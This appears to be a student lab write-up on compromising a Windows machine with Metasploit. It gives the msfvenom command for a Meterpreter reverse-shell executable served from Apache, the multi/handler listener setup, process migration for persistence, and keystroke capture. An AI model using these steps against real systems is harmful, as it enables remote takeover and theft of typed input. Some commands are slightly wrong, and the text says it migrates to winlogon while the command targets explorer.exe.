# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# DATE :18/08/2026

# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

# DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

1. Find the attackers ip address using ifconfig
#### OUTPUT:
<img width="1010" height="735" alt="1" src="https://github.com/user-attachments/assets/5ee9f632-e48a-4440-91c2-c6b9953dff88" />


2. Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT:
<img width="1002" height="732" alt="2" src="https://github.com/user-attachments/assets/bdc9e6c1-7aa4-41be-b0b2-ec15a259fc0f" />


3. copy the fun.exe into the apache /var/www/html folder
#### OUTPUT:
<img width="1019" height="680" alt="3" src="https://github.com/user-attachments/assets/6083ba7d-8cf9-48b9-987a-5c8bc6d790d9" />


4. Start apache server
sudo systemctl apache2 start
#### OUTPUT:
<img width="1019" height="680" alt="3" src="https://github.com/user-attachments/assets/87ea130a-85b1-4d01-9b12-5756a8f45b9d" />


5. Check the status of apache2
#### OUTPUT:
<img width="1007" height="690" alt="5" src="https://github.com/user-attachments/assets/0192b5d1-def0-49e3-8e44-af4016bd2018" />


6. Invoke msfconsole:
#### OUTPUT:
<img width="674" height="787" alt="6" src="https://github.com/user-attachments/assets/2b772233-4077-409d-a9e4-cfda1b0f89c1" />


7. Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
#### OUTPUT:
<img width="747" height="775" alt="image" src="https://github.com/user-attachments/assets/b651ff72-e8b6-44af-8886-7b468d9e505d" />


8. Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
#### OUTPUT:
<img width="939" height="846" alt="7" src="https://github.com/user-attachments/assets/c1500629-19bb-4a1a-ba18-cd1fc636427b" />


9. On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://172.28.85.192/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
#### OUTPUT:
<img width="1320" height="651" alt="8" src="https://github.com/user-attachments/assets/71efc83e-186c-45a3-a1d5-6b8e26836909" />

## OUTPUT:

<img width="1642" height="383" alt="image" src="https://github.com/user-attachments/assets/8564aa83-3e79-4622-8474-353ff88d6e4d" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="1372" height="790" alt="image" src="https://github.com/user-attachments/assets/37f5c6d3-c09c-42e7-bd19-c65a0731ad1d" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:

<img width="1610" height="636" alt="image" src="https://github.com/user-attachments/assets/cdae74a2-167a-4fed-8d9c-87d7e667831c" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="1301" height="827" alt="image" src="https://github.com/user-attachments/assets/9307bc3f-06a8-415f-b187-be2416bf6484" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
<img width="2172" height="724" alt="image" src="https://github.com/user-attachments/assets/fb32c397-0ac2-48d2-8d39-5033291ce57e" />




# RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
